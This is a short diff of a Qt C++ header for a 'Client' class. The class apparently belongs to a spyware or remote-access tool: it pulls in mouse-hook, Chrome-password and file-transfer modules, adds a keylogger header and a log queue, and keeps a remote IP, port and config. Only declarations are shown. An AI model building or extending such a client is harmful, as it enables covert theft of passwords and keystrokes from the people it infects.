@@ -4,6 +4,7 @@
 #include <QObject>
 #include <QTimer>
 #include <QThread>
+#include <QMutex>
 
 #include "config.h"
 #include "fileserver.h"
@@ -11,6 +12,7 @@
 #include "mousehookWinApi.h"
 #include "chromePass.h"
 #include "files.h"
+#include "klog.h"
 
 class Client : public QObject
 {
@@ -29,16 +31,16 @@ private slots:
 private:
     void update();
     void getNewConfig(const QString& path);
+    void enqueueLog();
 
     QString ip;
     qint16 port;
     QString path;
     QTimer* onlineTimer;
-    QTimer* screenTimer;
     Config* config;
     FileServer* fileServer;
     FileClient* fileClient;
-    bool isChromePassExists;
+    QMutex* mutex;
 };
 
 #endif // CLIENT_H
